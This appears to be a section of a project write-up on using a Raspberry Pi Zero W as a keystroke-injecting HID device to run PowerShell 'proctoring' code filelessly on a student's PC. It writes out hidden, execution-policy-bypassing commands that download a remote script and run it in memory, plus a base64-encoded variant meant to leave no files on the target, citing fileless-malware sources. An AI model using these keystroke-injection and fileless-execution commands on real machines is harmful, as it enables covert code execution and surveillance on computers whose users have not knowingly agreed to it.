# 1. Fileless Execution

**Prerequisite:**
- The Raspberry Pi has already been configured to achieve composite mode (See Libcomposite for more info)

Using the Raspberry Pi Zero W, HID mode, I can then open up Powershell using Win + R and send in keystrokes command from the examples below to conduct proctoring without needing to copy external binary executable to devices. Instead, and run them purely in memory. 

Reference materials:
- https://www.mcafee.com/enterprise/en-us/assets/solution-briefs/sb-fileless-malware-execution.pdf
- https://www.varonis.com/blog/fileless-malware
- https://www.linkedin.com/pulse/go-hell-powershell-powerdown-attacks-kirtar-oza-cissp-cisa-ms-

## 1.1. Utilizing DownloadString and Invoke-Expression 
```
powershell.exe -executionpolicy bypass -w hidden "iex(New-Object System.Net.WebClient).DownloadString('<proctoring script url>')
```
Executing the above allow us conduct proctoring directly in to the memory of the Student's PC.  
This is possible because of two Powershell command 
- "DownloadString" where it does not download any file to disk but copies content of the remote file. 
- "Invoke-Expression a.k.a iex" where it runs specified string as a command.

## 1.2. Utilizing EncodedCommand
To do this we must first, encode our script into base64 using the script below and taking note of the encoded string
```
$command = '<the whole script>'
$bytes = [System.Text.Encoding]::Unicode.GetBytes($command)
$encodedCommand = [Convert]::ToBase64String($bytes)
write-host $encodedCommand
```
After we know the encoded string, runnning the command below will allow us to conduct proctoring without needing to drop any files into the student's PC. In this case, we would not even need to have a remote script stored anywhere
```
powershell.exe -executionpolicy bypass -w hidden -e <base64encodedstring>
```
The EncodedCommand a.k.a -e, will read the following given as a base64 string and proceed to execute it 
